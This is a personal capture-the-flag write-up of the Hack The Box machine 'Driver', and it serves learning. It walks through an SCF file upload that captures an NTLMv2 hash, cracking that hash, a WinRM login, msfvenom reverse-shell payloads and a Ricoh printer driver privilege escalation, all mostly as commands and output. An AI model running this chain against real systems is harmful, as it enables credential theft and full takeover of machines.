---
title:  "HTB - Driver"
tags:
  - htb
  - writeup
programming-languagues:
created: 2022-07-17
---
# HTB - Driver
---
Printer exploitation!!

IP: 10.10.11.106

```bash
sudo nmap -sC -sV -oA driver.nmap $ip
```

Where:
- `-sC`: default scripts.
- `-sV`: version detection (`-A` enables version detection, OS detection, script scanning and traceroute).
- `-oA`: output to all formats.

Output:

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-17 18:26 BST
Nmap scan report for 10.10.11.106
Host is up (0.027s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-07-18T00:26:41
|_  start_date: 2022-07-18T00:22:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.10 seconds
```

We have **Microsoft IIS 10.0** in port 80, so Windows. It is a **MFP Firmware Update Center** with the username `admin`.

We also have 135 and 445, so it is listening on **SMB**.

We can try:

```bash
smbclient -L \\$ip

Enter WORKGROUP\hanato's password: 
session setup failed: NT_STATUS_ACCESS_DENIED

smbclient -N -L \\$ip
session setup failed: NT_STATUS_ACCESS_DENIED
```

- `-L`: list.
- `-N`: no pass, suppresses the normal password prompt, useful when there is no password.

We can use CrackMapExec ([CME](https://wiki.porchetta.industries/)). It automates assessing the security of **large** Active Directory networks. It makes heavy use of **Impacket**. More info [here](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/).

```bash
cme smb 10.10.11.106

SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
```

So the host is **Windows 10 Enterprive 10240 x64**. It could be either a domain controller or a windows bus. 

We go in the website and try the login `admin:admin` which works! We can see in firmware updates that we can upload a file, very promising. Also, the URL ends in `.php`.

We can enumerate the directories:

```bash
gobuster dir -u http://10.10.11.106 -U admin -P admin -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out
```

- `-U`: username.
- `-P`: password.
- `-x`: file type.

Ok, while this is running we can explore the website. We could probably try a [SCF file attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).

The SCF:

```bash
`[Shell]`

`Command=``2`

`IconFile=\\X.X.X.X\share\pentestlab.ico`

`[Taskbar]`

`Command=ToggleDesktop`
```

We can use **Responder** (in `/usr/share/responder`). I forgot THM open so I'll be using **tun1** not **tun0**:

```bash
sudo ./Responder.py -I tun1
```

Then we upload our **SCF** file, we get:

```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:3cf31016af90b3f5:27F3BAFD0569B4BCCB3512953792F56C:01010000000000000093F52B139AD80176C9F467FDFAD8A90000000002000800570056004B00510001001E00570049004E002D004A0047004D00340050004B004A00330038003200470004003400570049004E002D004A0047004D00340050004B004A0033003800320047002E00570056004B0051002E004C004F00430041004C0003001400570056004B0051002E004C004F00430041004C0005001400570056004B0051002E004C004F00430041004C00070008000093F52B139AD80106000400020000000800300030000000000000000000000000200000C0ED0045D2EFEA0FAB50E04EE1CABF0C376E10707EB410B0555517338A2C53A40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003200000000000000000000000000
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
```

I will try to figure out the hash:

```bash
hashcat driver.hash -m 5600 /usr/share/wordlists/rockyou.txt

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

TONY::DRIVER:3cf31016af90b3f5:27f3bafd0569b4bccb3512953792f56c:01010000000000000093f52b139ad80176c9f467fdfad8a90000000002000800570056004b00510001001e00570049004e002d004a0047004d00340050004b004a00330038003200470004003400570049004e002d004a0047004d00340050004b004a0033003800320047002e00570056004b0051002e004c004f00430041004c0003001400570056004b0051002e004c004f00430041004c0005001400570056004b0051002e004c004f00430041004c00070008000093f52b139ad80106000400020000000800300030000000000000000000000000200000c0ed0045d2efea0fab50e04ee1cabf0c376e10707eb410b0555517338a2c53a40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000:liltony
```

- `-m`: the type of hash, figured out by looking at [this](https://hashcat.net/wiki/doku.php?id=example_hashes) table.

The password is `liltony`! We can now do:

```bash
cme smb 10.10.11.106 -u tony -p lilton

SMB         10.10.11.106    445    DRIVER           [*] Windows 10.0 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:False)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony

cme smb 10.10.11.106 -u tony -p liltony --shares                                                                                                                                                                            7s
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
SMB         10.10.11.106    445    DRIVER           [+] Enumerated shares
SMB         10.10.11.106    445    DRIVER           Share           Permissions     Remark
SMB         10.10.11.106    445    DRIVER           -----           -----------     ------
SMB         10.10.11.106    445    DRIVER           ADMIN$                          Remote Admin
SMB         10.10.11.106    445    DRIVER           C$                              Default share
SMB         10.10.11.106    445    DRIVER           IPC$                            Remote IPC
```

We can also try `winrm` (Windows Remote Management), which normally uses ports 5985 and 5986:

```bash
nmap -p5985,5986 10.10.11.106 -n

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-17 19:36 BST
Nmap scan report for 10.10.11.106
Host is up (0.035s latency).

PORT     STATE    SERVICE
5985/tcp open     wsman
5986/tcp filtered wsmans

Nmap done: 1 IP address (1 host up) scanned in 3.45 seconds
```

- `-n`: no DNS resolution.

We can see that 5985 is indeed open :)

```bash
cme winrm 10.10.11.106 -u tony -p liltony                                                                                                                                                                                   4s
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d
```

We can use **[evil-winrm](https://github.com/Hackplayers/evil-winrm)** to exploit this. 

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony 
*Evil-WinRM* PS C:\Users\tony\Documents>
```

Now we can use something like **[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)** (by the way, `gobuster` finishes, nothing interesting unfortunaly).

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> cd \programdata
*Evil-WinRM* PS C:\programdata> upload exes/winPEASany.exe
```

We can see it has `RICOH` in it (from our `winPEAS` output):

```bash
C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23
     C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\do_not_delete_folders
     C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_com
```

Info about the exploit [here](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/).

So we don't need Administrator privilege to add a printer, just to add drivers. Therefore if the driver is there, we are all good. The `.dll` files are write-able by everyone.

Metasploit time!!!

We are going to use `exploit/windows/winrm/winrm_script_exe` with the following options:

```bash
Module options (exploit/windows/winrm/winrm_script_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
   FORCE_VBS  false            yes       Force the module to use the VBS CmdStager
   PASSWORD   liltony          yes       A specific password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.11.106     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      5985             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URI        /wsman           yes       The URI of the WinRM service
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   tony             yes       A specific username to authenticate as
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun1             yes       The listen address (an interface may be specified)
   LPORT     9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows
```   

```bash
[*] Started reverse TCP handler on 10.10.14.12:9001 
[-] Login Failure. Recheck your credentials
^C[*] Exploit completed, but no session was created.
```

Awww it doesn't work :(

Let's go for `msfvenom` then :)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=9001 -f exe -o msf.exe                                                                                                                          5m 14s
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: msf.exe
```

We then:

```bash
upload exes/msf.exe
```

Go to `msfconsole` and run the `exploit/multi/handler` on port 9001:

```bash
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.12      yes       The listen address (an interface may be specified)
   LPORT  9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

It worked!!!!

```bash
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.10.14.12:9001 
[*] Sending stage (200774 bytes) to 10.10.11.106
[*] Meterpreter session 1 opened (10.10.14.12:9001 -> 10.10.11.106:49447) at 2022-07-17 20:09:12 +0100

(Meterpreter 1)(C:\programdata) >
```

We can background it then use the `ricoh_driver_privesc` exploit:

```bash
Module options (exploit/windows/local/ricoh_driver_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun1             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows

[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer UjgJTcrEG...
```

And nothing happens :/

We can try with 32-bits, we do:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=9001 -f exe -o msf32.exe      INT
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: msf32.exe
```

Then:

```bash
*Evil-WinRM* PS C:\programdata> upload exes/msf32.exe
```

We listen in metasploit and run the file, don't forget to have the payload set for 32-bit not 64.

We then try our **RICOH** exploit again, but we still **hang**.

Let's try making our shell interactive. We go back to session 1 and run `ps` to list the services:

```bash
(Meterpreter 1)(C:\programdata) > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User         Path
 ---   ----  ----                     ----  -------  ----         ----
 0     0     [System Process]
 4     0     System
 264   4     smss.exe
 340   332   csrss.exe
 364   948   WUDFHost.exe
 448   332   wininit.exe
 456   440   csrss.exe
 500   440   winlogon.exe
 512   4660  msf32.exe                x86   0        DRIVER\tony  C:\ProgramData\msf32.exe
 564   448   services.exe
 572   448   lsass.exe
 656   564   svchost.exe
 664   512   cmd.exe                  x86   0        DRIVER\tony  C:\Windows\SysWOW64\cmd.exe
 704   564   svchost.exe
 816   564   sedsvc.exe
 820   564   svchost.exe
 828   656   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 840   500   dwm.exe
 860   564   svchost.exe
 868   564   svchost.exe
 948   564   svchost.exe
 984   564   svchost.exe
 1032  564   svchost.exe
 1232  564   spoolsv.exe
 1360  564   svchost.exe
 1452  4660  himum.exe                x64   0        DRIVER\tony  C:\ProgramData\himum.exe
 1488  656   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 1564  564   svchost.exe
 1592  564   svchost.exe
 1616  564   svchost.exe
 1624  564   VGAuthService.exe
 1644  564   vm3dservice.exe
 1720  564   svchost.exe
 1728  564   vmtoolsd.exe
 1820  1644  vm3dservice.exe
 1836  1452  cmd.exe                  x64   0        DRIVER\tony  C:\Windows\System32\cmd.exe
 2056  1452  cmd.exe                  x64   0        DRIVER\tony  C:\Windows\System32\cmd.exe
 2076  820   cmd.exe                  x64   1        DRIVER\tony  C:\Windows\System32\cmd.exe
 2176  656   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 2244  564   dllhost.exe
 2292  820   taskhostw.exe            x64   1        DRIVER\tony  C:\Windows\System32\taskhostw.exe
 2404  656   WmiPrvSE.exe
 2500  2076  conhost.exe              x64   1        DRIVER\tony  C:\Windows\System32\conhost.exe
 2508  1836  conhost.exe              x64   0        DRIVER\tony  C:\Windows\System32\conhost.exe
 2540  564   msdtc.exe
 2716  2076  PING.EXE                 x64   1        DRIVER\tony  C:\Windows\System32\PING.EXE
 2764  2056  conhost.exe              x64   0        DRIVER\tony  C:\Windows\System32\conhost.exe
 2768  564   SearchIndexer.exe
 2932  564   svchost.exe
 3036  664   conhost.exe              x64   0        DRIVER\tony  C:\Windows\System32\conhost.exe
 3060  820   sihost.exe               x64   1        DRIVER\tony  C:\Windows\System32\sihost.exe
 3284  3256  explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 3344  656   RuntimeBroker.exe        x64   1        DRIVER\tony  C:\Windows\System32\RuntimeBroker.exe
 3648  656   ShellExperienceHost.exe  x64   1        DRIVER\tony  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 3752  656   SearchUI.exe             x64   1        DRIVER\tony  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 3920  564   svchost.exe              x64   1        DRIVER\tony  C:\Windows\System32\svchost.exe
 4172  564   svchost.exe
 4660  656   wsmprovhost.exe          x64   0        DRIVER\tony  C:\Windows\System32\wsmprovhost.exe
 4856  3284  vmtoolsd.exe             x64   1        DRIVER\tony  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 4896  3284  OneDrive.exe             x86   1        DRIVER\tony  C:\Users\tony\AppData\Local\Microsoft\OneDrive\OneDrive.exe
```

The ones with *Session = 1* can interact with the Desktop, let's migrate to `OneDrive`.

```bash
(Meterpreter 5)(C:\programdata) > migrate 4896
[*] Migrating from 4116 to 4896...
[*] Migration completed successfully.
(Meterpreter 5)(C:\Windows\system32) > getpid
Current pid: 4896
```

Now we try **RICOH** again:

```bash
msf](Jobs:0 Agents:2) exploit(windows/local/ricoh_driver_privesc) >> options

Module options (exploit/windows/local/ricoh_driver_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun1             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


[msf](Jobs:0 Agents:2) exploit(windows/local/ricoh_driver_privesc) >> sessions -l

Active sessions
===============

  Id  Name  Type                     Information           Connection
  --  ----  ----                     -----------           ----------
  3         meterpreter x86/windows  DRIVER\tony @ DRIVER  10.10.14.12:9001 -> 10.10.11.106:49450 (10.10.11.106)
  5         meterpreter x86/windows  DRIVER\tony @ DRIVER  10.10.14.12:9001 -> 10.10.11.106:49452 (10.10.11.106)

[msf](Jobs:0 Agents:2) exploit(windows/local/ricoh_driver_privesc) >> set SESSION 5
SESSION => 5
[msf](Jobs:0 Agents:2) exploit(windows/local/ricoh_driver_privesc) >> run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer pqsAiaGG...
[*] Sending stage (200774 bytes) to 10.10.11.106
```

We `ctrl+c` and go to the session, it worked!!!

```bash
(Meterpreter 6)(C:\Users\Administrator\Desktop) > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2021-06-11 11:57:47 +0100  desktop.ini
100444/r--r--r--  34    fil   2022-07-18 01:23:19 +0100  root.txt

(Meterpreter 6)(C:\Users\Administrator\Desktop) > cat root.txt 
326e9952dcf20633ad8cab171735a2be
```

## Reference
- IppSec - Driver ([Video](https://www.youtube.com/watch?v=N2ahkarb-zI&t=634s))